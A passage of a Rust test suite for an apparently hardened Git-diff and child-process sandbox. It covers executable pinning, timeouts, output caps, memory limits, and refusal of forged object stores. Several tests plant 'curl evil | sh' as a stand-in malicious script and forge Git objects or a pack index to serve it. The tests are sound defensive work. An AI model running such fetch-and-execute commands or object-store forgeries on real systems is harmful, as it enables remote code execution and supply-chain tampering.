        let base = scratch("adr0010-nonutf8");
        let path = base.join(std::ffi::OsStr::from_bytes(b"bad\xff"));
        std::fs::create_dir(&path).unwrap();
        assert!(
            super::child::Isolation::create_in(&path)
                .err()
                .unwrap()
                .message
                .contains("not UTF-8")
        );
        assert_eq!(std::fs::read_dir(&path).unwrap().count(), 0);
    }
    #[test]
    fn adr0010_absolute_tmpdir_preserves_home_cwd_and_ceiling() {
        let base = scratch("adr0010-positive");
        let isolation = super::child::Isolation::create_in(&base).unwrap();
        let env = isolation.env();
        let home = env.iter().find(|(k, _)| *k == "HOME").unwrap().1;
        let ceiling = env
            .iter()
            .find(|(k, _)| *k == "GIT_CEILING_DIRECTORIES")
            .unwrap()
            .1;
        assert_eq!(isolation.dir.path(), Path::new(home));
        assert_eq!(Path::new(home).parent().unwrap(), Path::new(ceiling));
        assert_eq!(Path::new(ceiling), std::fs::canonicalize(base).unwrap());
    }

    #[test]
    fn predicted_private_names_do_not_exhaust_creation() {
        use super::child::PrivateDir;
        let base = scratch("predicted-names");
        for attempt in 0..64 {
            std::fs::create_dir(
                base.join(format!("forge-warden-{}-{attempt}", std::process::id())),
            )
            .unwrap();
        }
        let dir =
            PrivateDir::create_in(&base).expect("old predictable names must not exhaust creation");
        assert!(dir.path().is_dir());
    }

    #[test]
    fn a_freed_private_dir_gets_a_new_random_name() {
        // Fresh entropy is read for every creation, including after an earlier Drop.
        use super::child::PrivateDir;
        let base = scratch("name-reuse");
        let first = PrivateDir::create_in(&base).unwrap();
        let name = first.path().to_owned();
        drop(first);
        let second = PrivateDir::create_in(&base).unwrap();
        assert_ne!(second.path(), name);
        let live = PrivateDir::create_in(&base).unwrap();
        assert_ne!(live.path(), second.path(), "a live name is never reused");
    }

    #[test]
    fn a_private_dir_skips_taken_names_and_reports_other_errors_at_once() {
        use super::child::{GIT_STDERR_CAP, PrivateDir};
        let base = scratch("private-dir-collision");
        std::fs::create_dir_all(base.join(format!("forge-warden-{}-0", std::process::id())))
            .unwrap();
        let dir = PrivateDir::create_in(&base).unwrap();
        assert!(dir.path().is_dir());
        assert_ne!(
            dir.path(),
            base.join(format!("forge-warden-{}-0", std::process::id()))
        );
        drop(dir);
        let missing = PrivateDir::create_in(&base.join("no-such-dir")).unwrap_err();
        assert!(
            missing.message.starts_with("creating a private directory"),
            "{}",
            missing.message
        );
        let _cleaned = std::fs::remove_dir_all(&base);
        assert_eq!(GIT_STDERR_CAP, 65_536);
    }

    #[test]
    fn the_ranker_runs_as_deep_diff_forge_with_its_stderr_capped_at_64_kib() {
        use super::child::{RANKER_ARGS, RANKER_STDERR_CAP};
        assert_eq!(RANKER_ARGS, ["--stdin-patch", "--rank", "--json"]);
        assert_eq!(RANKER_STDERR_CAP, 65_536);
    }

    #[test]
    fn the_private_base_is_admitted_only_if_safe_for_cwd_home_and_ceiling() {
        use super::child::admit_base;
        use std::os::unix::ffi::OsStrExt as _;
        let root = scratch("admit");
        let refused = |base: &Path| admit_base(base).unwrap_err().message;
        assert!(refused(Path::new("relative/dir")).ends_with("not absolute"));
        assert_eq!(
            admit_base(Path::new("relative/dir")).unwrap_err().kind,
            super::DoorErrorKind::Environment
        );
        let colon = root.join("colon:base");
        std::fs::create_dir_all(&colon).unwrap();
        assert!(
            refused(&colon).contains("contains ':'"),
            "{}",
            refused(&colon)
        );
        let not_utf8 = root.join(std::ffi::OsStr::from_bytes(b"bad\xffname"));
        std::fs::create_dir_all(&not_utf8).unwrap();
        assert!(
            refused(&not_utf8).ends_with("not UTF-8"),
            "{}",
            refused(&not_utf8)
        );
        let real = root.join("real");
        std::fs::create_dir_all(&real).unwrap();
        std::os::unix::fs::symlink(&real, root.join("link")).unwrap();
        let canonical = std::fs::canonicalize(&real).unwrap();
        assert_eq!(
            admit_base(&root.join("link")).unwrap(),
            canonical.to_str().unwrap()
        );
        assert_eq!(admit_base(&real).unwrap(), canonical.to_str().unwrap());
        let _cleaned = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn a_candidate_repository_around_the_private_dir_is_never_consulted() {
        use super::child::git_facts_in;
        // Bastion B-C1b-01: a candidate repository whose own config breaks `git apply`.
        let candidate = scratch("candidate");
        let git = |args: &[&str], cwd: &Path| {
            command("/usr/bin/git")
                .args(args)
                .current_dir(cwd)
                .env_remove("GIT_DIR")
                .output()
                .unwrap()
        };
        assert!(git(&["init", "-q"], &candidate).status.success());
        assert!(
            git(
                &["config", "apply.ignoreWhitespace", "definitely-invalid"],
                &candidate
            )
            .status
            .success()
        );
        let inner = candidate.join("sub");
        std::fs::create_dir_all(&inner).unwrap();
        let patch = b"diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n";
        // The trap is live: Git started inside the candidate, with no ceiling, reads its config.
        let trapped = command("/usr/bin/git")
            .args(["apply", "--numstat", "-"])
            .current_dir(&inner)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .and_then(|mut child| {
                use std::io::Write as _;
                // Git may refuse the config and exit before reading stdin (EPIPE): only its
                // exit status matters here.
                let _written = child.stdin.take().unwrap().write_all(patch);
                child.wait()
            })
            .unwrap();
        assert!(
            !trapped.success(),
            "the candidate config must break an unguarded git apply"
        );
        // Through the door, with the private base inside the candidate, the ceiling holds.
        let (numstat, _summary) = git_facts_in(&test_git(), patch, &inner).unwrap();
        assert_eq!(numstat, b"1\t1\tx\0");
        let _cleaned = std::fs::remove_dir_all(&candidate);
    }

    #[test]
    fn a_large_input_round_trips_without_deadlock() {
        let input = vec![b'x'; 4 * 1024 * 1024];
        let out = run_child(&spec(Program::Absolute(Path::new("/bin/cat")), &[], &input)).unwrap();
        assert_eq!(out.stdout.len(), input.len());
        assert_eq!(out.stdout, input);
    }

    #[test]
    fn a_timeout_kills_the_whole_group() {
        // The marker carries this test process's id, so a concurrent run (or a mutant that leaves
        // its own grandchildren behind) can never be mistaken for a leak from this test.
        let marker = format!("sleep 31.{}", std::process::id());
        let script = format!("{marker} & {marker}; wait");
        let args = sh(&script);
        let mut s = spec(Program::Absolute(Path::new("/bin/sh")), &args, b"");
        s.timeout = Duration::from_millis(300);
        let started = Instant::now();
        assert_eq!(run_child(&s), Err(ChildFailure::Timeout));
        assert!(
            started.elapsed() < Duration::from_secs(3),
            "{:?}",
            started.elapsed()
        );
        assert!(none_left(&marker));
    }

    #[test]
    fn a_grandchild_holding_the_pipes_is_reaped() {
        let marker = format!("sleep 32.{}", std::process::id());
        let script = format!("{marker} & echo started");
        let args = sh(&script);
        let started = Instant::now();
        let out = run_child(&spec(Program::Absolute(Path::new("/bin/sh")), &args, b"")).unwrap();
        assert_eq!(out.stdout, b"started\n");
        assert!(
            started.elapsed() < Duration::from_secs(3),
            "{:?}",
            started.elapsed()
        );
        assert!(none_left(&marker));
    }

    #[test]
    fn output_over_either_cap_is_a_failure_not_a_truncation() {
        let flood_out = sh("head -c 2000 /dev/zero");
        let mut over_out = spec(Program::Absolute(Path::new("/bin/sh")), &flood_out, b"");
        over_out.stdout_cap = 1000;
        assert_eq!(run_child(&over_out), Err(ChildFailure::StdoutOverflow));
        let flood_err = sh("head -c 2000 /dev/zero >&2");
        let mut over_err = spec(Program::Absolute(Path::new("/bin/sh")), &flood_err, b"");
        over_err.stderr_cap = 1000;
        assert_eq!(run_child(&over_err), Err(ChildFailure::StderrOverflow));
        let exact = sh("head -c 1000 /dev/zero");
        let mut at_cap = spec(Program::Absolute(Path::new("/bin/sh")), &exact, b"");
        at_cap.stdout_cap = 1000;
        assert_eq!(
            run_child(&at_cap).map(|o| o.stdout.len()),
            Ok(1000),
            "exactly the cap is allowed"
        );
    }

    #[test]
    fn a_nonzero_exit_or_a_signal_fails_even_with_valid_looking_output() {
        let exits = sh("echo '{\"ranked\":[]}'; exit 3");
        assert_eq!(
            run_child(&spec(Program::Absolute(Path::new("/bin/sh")), &exits, b"")),
            Err(ChildFailure::Exit {
                code: 3,
                stderr: String::new()
            })
        );
        let killed = sh("echo ok; kill -9 $$");
        assert_eq!(
            run_child(&spec(Program::Absolute(Path::new("/bin/sh")), &killed, b"")),
            Err(ChildFailure::Signal(9))
        );
    }

    #[test]
    fn the_environment_is_exactly_the_allowlist() {
        let mut s = spec(Program::Absolute(Path::new("/usr/bin/env")), &[], b"");
        s.env = &[("LC_ALL", "C"), ("GIT_CONFIG_NOSYSTEM", "1")];
        let out = run_child(&s).unwrap();
        let mut lines: Vec<&[u8]> = out
            .stdout
            .split(|b| *b == b'\n')
            .filter(|l| !l.is_empty())
            .collect();
        lines.sort_unstable();
        assert_eq!(lines, [&b"GIT_CONFIG_NOSYSTEM=1"[..], &b"LC_ALL=C"[..]]);
    }

    #[test]
    fn a_relative_program_is_refused() {
        assert!(matches!(
            run_child(&spec(Program::Absolute(Path::new("sh")), &[], b"")),
            Err(ChildFailure::Spawn(_))
        ));
    }

    #[test]
    fn the_pin_budget_is_512_mib_and_an_executable_over_it_is_refused_as_input() {
        assert_eq!(MAX_EXECUTABLE_BYTES, 536_870_912);
        let refused = pin_within(Path::new("/usr/bin/true"), 16).unwrap_err();
        assert_eq!(
            refused.kind,
            super::DoorErrorKind::OverBudget,
            "{}",
            refused.message
        );
        assert!(pin_within(Path::new("/usr/bin/true"), MAX_EXECUTABLE_BYTES).is_ok());
    }

    #[test]
    fn a_root_owned_system_binary_can_be_pinned_and_run() {
        let pinned = pin_executable(Path::new("/usr/bin/true")).unwrap();
        assert_eq!(
            run_child(&spec(Program::Pinned(&pinned), &[], b"")).map(|o| o.stdout),
            Ok(Vec::new())
        );
    }

    #[test]
    fn a_pinned_executable_runs_the_hashed_bytes_after_its_path_is_swapped() {
        let dir = scratch("swap");
        let path = dir.join("ranker");
        copy_out_of_process("/usr/bin/true", &path);
        copy_out_of_process("/usr/bin/false", &dir.join("other"));
        let pinned = pin_executable(&path).unwrap();
        let expected =
            forge_warden_core::seal::sha256_hex(&std::fs::read("/usr/bin/true").unwrap());
        assert_eq!(pinned.sha256, expected);
        std::fs::rename(dir.join("other"), &path).unwrap();
        // The path now holds `false` (exit 1); the pinned descriptor still runs `true`.
        let out = run_child(&spec(Program::Pinned(&pinned), &[], b""));
        assert_eq!(out.map(|o| o.stdout), Ok(Vec::new()));
        let swapped = run_child(&spec(Program::Absolute(&path), &[], b""));
        assert!(matches!(swapped, Err(ChildFailure::Exit { code: 1, .. })));
    }

    #[test]
    fn pinning_refuses_symlinks_and_writable_files_and_scripts_do_not_run() {
        use std::os::unix::fs::PermissionsExt as _;
        let dir = scratch("refuse");
        let real = dir.join("real");
        copy_out_of_process("/usr/bin/true", &real);
        std::os::unix::fs::symlink(&real, dir.join("link")).unwrap();
        assert!(pin_executable(&dir.join("link")).is_err(), "symlink");
        std::fs::set_permissions(&real, std::fs::Permissions::from_mode(0o775)).unwrap();
        let writable = pin_executable(&real).unwrap_err();
        assert!(
            writable.message.contains("writable by group or others"),
            "{}",
            writable.message
        );
        let script = dir.join("script");
        let source = dir.join("script.src");
        std::fs::write(&source, "#!/bin/sh\necho ran\n").unwrap();
        copy_out_of_process(source.to_str().unwrap(), &script);
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
        let pinned = pin_executable(&script).unwrap();
        // The interpreter starts but cannot reopen the closed descriptor: the script never runs.
        let out = run_child(&spec(Program::Pinned(&pinned), &[], b""));
        assert!(matches!(&out, Err(ChildFailure::Exit { .. })), "{out:?}");
    }

    // ---- Bound mode (ADR 0012 D2/D3; M7-PATCH-BOUND step a) ----

    #[test]
    fn every_bound_mode_git_child_runs_under_the_memory_caps() {
        // Lodestar's ruling on review S2: /usr/bin/prlimit sets RLIMIT_DATA and RLIMIT_AS before
        // the admitted Git runs. The child reports its own limits through a shell alias.
        let git = test_git();
        let out = run_child(&ChildSpec {
            program: super::child::bound_program(&git),
            args: &["-c", "alias.limits=!cat /proc/self/limits", "limits"],
            stdin: b"",
            env: &[
                ("HOME", "/nonexistent"),
                ("GIT_CONFIG_NOSYSTEM", "1"),
                ("GIT_CONFIG_GLOBAL", "/dev/null"),
            ],
            cwd: Path::new("/"),
            timeout: Duration::from_secs(10),
            stdout_cap: 64 * 1024,
            stderr_cap: 64 * 1024,
        })
        .unwrap();
        let limits = String::from_utf8(out.stdout).unwrap();
        let row = |name: &str| {
            limits
                .lines()
                .find(|l| l.starts_with(name))
                .unwrap_or_else(|| panic!("no {name} row in {limits}"))
                .split_whitespace()
                .rev()
                .nth(2)
                .unwrap()
                .to_owned()
        };
        assert_eq!(row("Max data size"), super::child::DATA_CAP.to_string());
        assert_eq!(
            row("Max address space"),
            super::child::ADDRESS_SPACE_CAP.to_string()
        );
    }

    /// A repository built by real Git in a scratch directory; `git(args)` runs in it.
    struct Repo {
        dir: PathBuf,
    }

    impl Repo {
        fn new(label: &str, format: &str) -> Self {
            let dir = scratch(label);
            let repo = Repo { dir };
            repo.git(&[
                "init",
                "-q",
                &format!("--object-format={format}"),
                "-b",
                "main",
            ]);
            repo
        }
        fn git(&self, args: &[&str]) -> String {
            let out = command("/usr/bin/git")
                .args([
                    "-c",
                    "user.name=t",
                    "-c",
                    "user.email=t@example.invalid",
                    "-c",
                    "commit.gpgsign=false",
                ])
                .args(args)
                .current_dir(&self.dir)
                .env_remove("GIT_DIR")
                .output()
                .unwrap();
            assert!(
                out.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&out.stderr)
            );
            String::from_utf8(out.stdout).unwrap().trim().to_owned()
        }
        fn commit(&self, path: &str, text: &str) -> String {
            let file = self.dir.join(path);
            std::fs::create_dir_all(file.parent().unwrap()).unwrap();
            std::fs::write(&file, text).unwrap();
            self.git(&["add", "--", path]);
            self.git(&["commit", "-q", "-m", path]);
            self.git(&["rev-parse", "HEAD"])
        }
        fn objects(&self) -> PathBuf {
            super::child::admit_repository(&self.dir).unwrap()
        }
        /// `scripts/make_patch.sh base head` on this repository.
        fn make_patch(&self, base: &str, head: &str) -> Vec<u8> {
            let script =
                PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../scripts/make_patch.sh");
            let out = command("/usr/bin/bash")
                .arg(script)
                .args([base, head])
                .arg(&self.dir)
                .output()
                .unwrap();
            assert!(
                out.status.success(),
                "make_patch: {}",
                String::from_utf8_lossy(&out.stderr)
            );
            out.stdout
        }
    }

    /// One bound run on `repo`; it must leave nothing in its temporary base.
    struct Ran(Result<super::child::BoundDiff, super::child::BoundFailure>);

    fn bound(repo: &Repo, base: &str, head: &str) -> Ran {
        let tmp = scratch("bound-tmp");
        let result = super::child::bound_diff_in(
            &test_git(),
            &repo.objects(),
            base,
            head,
            &tmp,
            Duration::from_secs(60),
            super::child::CAPS,
        );
        assert_eq!(
            std::fs::read_dir(&tmp).unwrap().count(),
            0,
            "bound mode left files in its temporary base"
        );
        Ran(result)
    }

    #[test]
    fn bound_mode_makes_the_patch_make_patch_makes() {
        let repo = Repo::new("bound-linear", "sha1");
        let root = repo.commit("a.txt", "one\n");
        repo.commit("b.txt", "two\n");
        let base = repo.commit("a.txt", "one\nmore\n");
        repo.git(&["checkout", "-q", "-b", "topic", &root]);
        repo.commit("src/x.rs", "fn x() {}\n");
        let head = repo.commit("a.txt", "changed\n");
        let made = bound(&repo, &base, &head).0.unwrap();
        assert_eq!(made.merge_base, root);
        assert_eq!(
            String::from_utf8_lossy(&made.patch),
            String::from_utf8_lossy(&repo.make_patch(&base, &head))
        );
        assert!(
            String::from_utf8_lossy(&made.patch).contains("--- a/src/x.rs\n")
                || String::from_utf8_lossy(&made.patch).contains("+++ b/src/x.rs\n")
        );
    }

    #[test]
    fn bound_mode_cuts_at_the_copy_edge_when_head_reaches_older_history_through_a_merge() {
        // The shape forge-warden's own history has (Q-C record): head merges a branch that starts
        // below the merge base, so `shallow` = the merge base alone walks into an uncopied commit.
        let repo = Repo::new("bound-merge", "sha1");
        let a = repo.commit("a.txt", "a\n");
        let base = repo.commit("b.txt", "b\n");
        repo.git(&["checkout", "-q", "-b", "side", &a]);
        repo.commit("side.txt", "side\n");
        repo.git(&["checkout", "-q", "-b", "topic", &base]);
        repo.git(&["merge", "-q", "--no-edit", "side"]);
        let head = repo.commit("c.txt", "c\n");
        let made = bound(&repo, &base, &head).0.unwrap();
        assert_eq!(made.merge_base, base);
        assert_eq!(made.patch, repo.make_patch(&base, &head));
    }

    #[test]
    fn bound_mode_refuses_several_merge_bases_and_no_common_history() {
        let repo = Repo::new("bound-criss-cross", "sha1");
        let root = repo.commit("a.txt", "0\n");
        repo.git(&["checkout", "-q", "-b", "x", &root]);
        let x = repo.commit("x.txt", "x\n");
        repo.git(&["checkout", "-q", "-b", "y", &root]);
        let y = repo.commit("y.txt", "y\n");
        repo.git(&["checkout", "-q", "-b", "m1", &x]);
        repo.git(&["merge", "-q", "--no-edit", &y]);
        let m1 = repo.git(&["rev-parse", "HEAD"]);
        repo.git(&["checkout", "-q", "-b", "m2", &y]);
        repo.git(&["merge", "-q", "--no-edit", &x]);
        let m2 = repo.git(&["rev-parse", "HEAD"]);
        assert_eq!(
            bound(&repo, &m1, &m2).0,
            Err(super::child::BoundFailure::SeveralMergeBases(2))
        );
        repo.git(&["checkout", "-q", "--orphan", "other"]);
        let other = repo.commit("o.txt", "o\n");
        assert_eq!(
            bound(&repo, &m1, &other).0,
            Err(super::child::BoundFailure::NoCommonHistory)
        );
    }

    #[test]
    fn bound_mode_takes_only_full_commit_ids() {
        let repo = Repo::new("bound-ids", "sha1");
        let base = repo.commit("a.txt", "a\n");
        let head = repo.commit("a.txt", "b\n");
        let blob = repo.git(&["rev-parse", "HEAD:a.txt"]);
        let (short, long, upper) = (
            base.get(..12).unwrap().to_owned(),
            format!("{head}{}", "0".repeat(24)),
            base.to_uppercase(),
        );
        let truncated = head.get(..39).unwrap().to_owned();
        for (b, h) in [
            (short.as_str(), head.as_str()),
            (base.as_str(), truncated.as_str()),
            (base.as_str(), long.as_str()),
            (upper.as_str(), head.as_str()),
        ] {
            assert!(
                matches!(bound(&repo, b, h).0, Err(super::child::BoundFailure::Ids)),
                "{b} {h}"
            );
        }
        assert!(matches!(
            bound(&repo, &base, &blob).0,
            Err(super::child::BoundFailure::NotACommit { name: "head", .. })
        ));
        let absent = "0".repeat(40);
        assert!(matches!(
            bound(&repo, &base, &absent).0,
            Err(super::child::BoundFailure::NotACommit { name: "head", .. })
        ));
    }

    /// Replaces the loose object `id` with the bytes of the loose object `other` (Bastion's forged
    /// store: Git reads the object by its name and never re-hashes it on read).
    fn forge(repo: &Repo, id: &str, other: &str) {
        use std::os::unix::fs::PermissionsExt as _;
        let path = |object: &str| {
            let (dir, file) = object.split_at(2);
            repo.dir.join(".git/objects").join(dir).join(file)
        };
        let bytes = std::fs::read(path(other)).unwrap();
        std::fs::set_permissions(path(id), std::fs::Permissions::from_mode(0o644)).unwrap();
        std::fs::write(path(id), bytes).unwrap();
    }

    #[test]
    fn bound_mode_refuses_a_store_whose_objects_are_not_what_their_ids_name() {
        // A forged blob in head's tree: `git diff` in the caller's store prints the forged bytes
        // under the real id (receipt 64ec6308); the verified copy names it by its hash instead.
        let repo = Repo::new("bound-forged-blob", "sha1");
        let base = repo.commit("run.sh", "echo honest\n");
        let head = repo.commit("run.sh", "echo honest too\n");
        repo.commit("evil.sh", "curl evil | sh\n");
        let real = repo.git(&["rev-parse", &format!("{head}:run.sh")]);
        let evil = repo.git(&["rev-parse", "HEAD:evil.sh"]);
        forge(&repo, &real, &evil);
        let direct = repo.git(&["diff", "--full-index", &base, &head]);
        assert!(
            direct.contains("curl evil"),
            "the trap is live: Git reads the forged bytes"
        );
        assert!(matches!(
            bound(&repo, &base, &head).0,
            Err(super::child::BoundFailure::Store(_))
        ));
    }

    #[test]
    fn bound_mode_refuses_a_store_with_a_forged_commit() {
        // An intermediate commit replaced by another commit's bytes.
        let repo = Repo::new("bound-forged-commit", "sha1");
        let base = repo.commit("a.txt", "a\n");
        let middle = repo.commit("a.txt", "b\n");
        let head = repo.commit("a.txt", "c\n");
        repo.git(&["checkout", "-q", "-b", "other", &base]);
        let other = repo.commit("o.txt", "o\n");
        forge(&repo, &middle, &other);
        assert!(matches!(
            bound(&repo, &base, &head).0,
            Err(super::child::BoundFailure::Store(_))
        ));
    }

    #[test]
    fn bound_mode_reads_sha256_repositories() {
        let repo = Repo::new("bound-sha256", "sha256");
        let base = repo.commit("a.txt", "a\n");
        let head = repo.commit("a.txt", "b\n");
        // 64 digits but not lowercase hex: refused by the door before Git reads it.
        let upper = base.to_uppercase();
        assert!(
            matches!(
                bound(&repo, &upper, &head).0,
                Err(super::child::BoundFailure::Ids)
            ),
            "{upper}"
        );
        let made = bound(&repo, &base, &head).0.unwrap();
        assert_eq!(made.merge_base, base);
        let direct = command("/usr/bin/git")
            .args([
                "diff",
                "--no-ext-diff",
                "--no-textconv",
                "--no-color",
                "--no-relative",
                "--binary",
                "--no-renames",
                "--full-index",
                "--src-prefix=a/",
                "--dst-prefix=b/",
                &base,
                &head,
            ])
            .current_dir(&repo.dir)
            .output()
            .unwrap();
        assert_eq!(made.patch, direct.stdout);
    }

    #[test]
    fn bound_mode_keeps_a_redundant_merges_in_copy_edge() {
        // Bastion, verify of 148513ea (Must 1): head's line has a merge whose second parent is an
        // ancestor of mb (outside the copy). Shallowing that copied merge dropped its in-copy edge
        // too, and an honest store was refused with "no common history". Now the outside parent's
        // commit object is copied and shallowed instead.
        let repo = Repo::new("bound-redundant", "sha1");
        repo.commit("r.txt", "r\n");
        let m1 = repo.commit("a.txt", "1\n");
        let mb = repo.commit("a.txt", "mb\n");
        repo.git(&["checkout", "-q", "-b", "side", &mb]);
        let a1 = repo.commit("s.txt", "a1\n");
        let x = repo.git(&[
            "commit-tree",
            "-p",
            &a1,
            "-p",
            &m1,
            "-m",
            "redundant",
            &format!("{a1}^{{tree}}"),
        ]);
        repo.git(&["reset", "-q", "--hard", &x]);
        let head = repo.commit("s.txt", "h1\n");
        repo.git(&["checkout", "-q", "main"]);
        let base = repo.commit("b.txt", "b\n");
        assert_eq!(repo.git(&["merge-base", "--all", &base, &head]), mb);
        let made = bound(&repo, &base, &head).0.unwrap();
        assert_eq!(made.merge_base, mb);
        assert_eq!(made.patch, repo.make_patch(&base, &head));
    }

    #[test]
    fn bound_mode_refuses_when_both_sides_reach_one_old_commit_past_the_boundary() {
        // A known limit (ADR 0012 D3.3 correction): base's and head's lines both merge the same commit
        // `old` from below mb's parent. In verified, mb's parent is a shallow boundary, so verified
        // cannot see that `old` is below mb and gives two merge bases. The run is refused (exit 3);
        // a wrong merge base is never used. When `old` is mb's own parent, verified keeps mb's edge
        // to it and the run passes (the second case).
        for gap in [true, false] {
            let repo = Repo::new("bound-redundant-both", "sha1");
            repo.commit("r.txt", "r\n");
            let old = repo.commit("a.txt", "1\n");
            if gap {
                repo.commit("a.txt", "2\n");
            }
            let mb = repo.commit("a.txt", "mb\n");
            let merge_old = |name: &str| {
                repo.git(&["checkout", "-q", "-b", name, &mb]);
                let tip = repo.commit(&format!("{name}.txt"), "x\n");
                let m = repo.git(&[
                    "commit-tree",
                    "-p",
                    &tip,
                    "-p",
                    &old,
                    "-m",
                    "redundant",
                    &format!("{tip}^{{tree}}"),
                ]);
                repo.git(&["reset", "-q", "--hard", &m]);
                repo.commit(&format!("{name}.txt"), "y\n")
            };
            let base = merge_old("left");
            let head = merge_old("right");
            assert_eq!(repo.git(&["merge-base", "--all", &base, &head]), mb);
            let ran = bound(&repo, &base, &head).0;
            if gap {
                assert!(
                    matches!(&ran, Err(super::child::BoundFailure::VerifiedMergeBase(why)) if why.contains("verified copy gives no single merge base") && why.contains("2 merge bases")),
                    "{ran:?}"
                );
            } else {
                let made = ran.unwrap();
                assert_eq!(made.merge_base, mb);
                assert_eq!(made.patch, repo.make_patch(&base, &head));
            }
        }
    }

    #[test]
    fn bound_mode_refuses_a_forged_tree() {
        // Bastion's row (ADR 0012 acceptance item 2): head's root tree replaced by another tree's bytes.
        let repo = Repo::new("bound-forged-tree", "sha1");
        let base = repo.commit("a.txt", "a\n");
        let head = repo.commit("run.sh", "echo honest\n");
        repo.git(&["checkout", "-q", "-b", "o", &base]);
        let other = repo.commit("run.sh", "curl evil | sh\n");
        let tree = repo.git(&["rev-parse", &format!("{head}^{{tree}}")]);
        let evil_tree = repo.git(&["rev-parse", &format!("{other}^{{tree}}")]);
        forge(&repo, &tree, &evil_tree);
        assert!(
            repo.git(&["diff", "--full-index", &base, &head])
                .contains("curl evil"),
            "the trap is live"
        );
        assert!(matches!(
            bound(&repo, &base, &head).0,
            Err(super::child::BoundFailure::Store(_))
        ));
    }

    #[test]
    fn bound_mode_refuses_a_lying_pack_index() {
        // Bastion's row (item 2): a pack whose .idx maps head's blob id to another blob's offset.
        let repo = Repo::new("bound-lying-idx", "sha1");
        let base = repo.commit("run.sh", "echo honest\n");
        let head = repo.commit("run.sh", "echo honest too\n");
        repo.commit("evil.sh", "curl evil | sh\n");
        let real = repo.git(&["rev-parse", &format!("{head}:run.sh")]);
        let evil = repo.git(&["rev-parse", "HEAD:evil.sh"]);
        repo.git(&["repack", "-a", "-d", "-q"]);
        let idx = std::fs::read_dir(repo.dir.join(".git/objects/pack"))
            .unwrap()
            .map(|e| e.unwrap().path())
            .find(|p| p.extension().is_some_and(|x| x == "idx"))
            .unwrap();
        let mut bytes = std::fs::read(&idx).unwrap();
        // idx v2: 8-byte header, 256 fan-out words, N names (20 bytes), N CRC-32s, N offsets (4).
        let word = |at: usize| -> [u8; 4] { bytes.get(at..at + 4).unwrap().try_into().unwrap() };
        let n = usize::try_from(u32::from_be_bytes(word(8 + 255 * 4))).unwrap();
        let names = 8 + 256 * 4;
        let position = |id: &str| {
            let want: Vec<u8> = (0..20)
                .map(|i| u8::from_str_radix(id.get(2 * i..2 * i + 2).unwrap(), 16).unwrap())
                .collect();
            (0..n)
                .find(|i| {
                    bytes.get(names + 20 * i..names + 20 * i + 20).unwrap() == want.as_slice()
                })
                .unwrap()
        };
        let offsets = names + 24 * n;
        let (r, e) = (offsets + 4 * position(&real), offsets + 4 * position(&evil));
        let evil_offset = word(e);
        bytes
            .get_mut(r..r + 4)
            .unwrap()
            .copy_from_slice(&evil_offset);
        {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::set_permissions(&idx, std::fs::Permissions::from_mode(0o644)).unwrap();
        }
        std::fs::write(&idx, bytes).unwrap();
        assert!(
            repo.git(&["cat-file", "-p", &real]).contains("curl evil"),
            "the trap is live: plain Git reads the other blob"
        );
        assert!(matches!(
            bound(&repo, &base, &head).0,
            Err(super::child::BoundFailure::Store(_))
        ));
    }

    #[test]
    fn bound_mode_reads_no_commit_graph_or_multi_pack_index() {
        // Bastion's row (item 2): garbage in both is not read; the honest diff is made.
        let repo = Repo::new("bound-graph-midx", "sha1");
        let base = repo.commit("a.txt", "a\n");
        let head = repo.commit("b.txt", "b\n");
        repo.git(&["repack", "-a", "-d", "-q"]);
        repo.git(&["commit-graph", "write", "--reachable"]);
        repo.git(&["multi-pack-index", "write"]);
        for f in [
            repo.dir.join(".git/objects/info/commit-graph"),
            repo.dir.join(".git/objects/pack/multi-pack-index"),
        ] {
            use std::os::unix::fs::PermissionsExt as _;
            let mut b = std::fs::read(&f).unwrap();
            let end = b.len() - 20;
            for x in b.get_mut(64..end).unwrap() {
                *x ^= 0x5a;
            }
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o644)).unwrap();
            std::fs::write(&f, b).unwrap();
        }
        let made = bound(&repo, &base, &head).0.unwrap();
        assert_eq!(made.patch, repo.make_patch(&base, &head));
    }

    #[test]
    fn bound_mode_edge_ids_and_a_gitlink() {
        // Bastion's rows: base = head is an empty diff; a tag or tree id is not a commit; a gitlink
        // in head gives make_patch's bytes.
        let repo = Repo::new("bound-edges", "sha1");
        let base = repo.commit("a.txt", "a\n");
        let head = repo.commit("a.txt", "b\n");
        let same = bound(&repo, &head, &head).0.unwrap();
        assert_eq!(same.patch, Vec::<u8>::new());
        assert_eq!(same.patch, repo.make_patch(&head, &head));
        repo.git(&["tag", "-a", "-m", "t", "t1", &head]);
        let tag = repo.git(&["rev-parse", "t1"]);
        let tree = repo.git(&["rev-parse", &format!("{base}^{{tree}}")]);
        for (b, h) in [
            (base.as_str(), tag.as_str()),
            (tree.as_str(), head.as_str()),
        ] {
            assert!(
                matches!(
                    bound(&repo, b, h).0,
                    Err(super::child::BoundFailure::NotACommit { .. })
                ),
                "{b} {h}"
            );
        }
        repo.git(&[
            "update-index",
            "--add",
            "--cacheinfo",
            &format!("160000,{base},vendor/sub"),
        ]);
        repo.git(&["commit", "-q", "-m", "gitlink"]);
        let with_link = repo.git(&["rev-parse", "HEAD"]);
        let made = bound(&repo, &head, &with_link).0.unwrap();
        assert_eq!(made.patch, repo.make_patch(&head, &with_link));
    }

    #[test]
    fn bound_mode_ignores_hostile_caller_settings() {
        // Bastion's row (item 4): the caller's config, attributes, grafts and replace refs.
        let repo = Repo::new("bound-hostile", "sha1");
        let base = repo.commit("a.txt", "a\n");
        repo.commit("dir/x.txt", "x\n");
        repo.commit("bin.dat", "\0\x01binary\n");
        repo.commit("caf\u{e9} file.txt", "accented name\n");
        repo.commit(".gitattributes", "*.txt -diff\n*.dat diff=evil\n");
        let head = repo.commit("a.txt", "a2\n");
        let clean = bound(&repo, &base, &head).0.unwrap();
        for (k, v) in [
            ("diff.noprefix", "true"),
            ("diff.relative", "true"),
            ("diff.mnemonicPrefix", "true"),
            ("diff.external", "/bin/false"),
            ("diff.renames", "copies"),
            ("diff.evil.textconv", "/bin/false"),
            ("diff.algorithm", "patience"),
            ("diff.context", "9"),
            ("core.quotePath", "false"),
            ("color.diff", "always"),
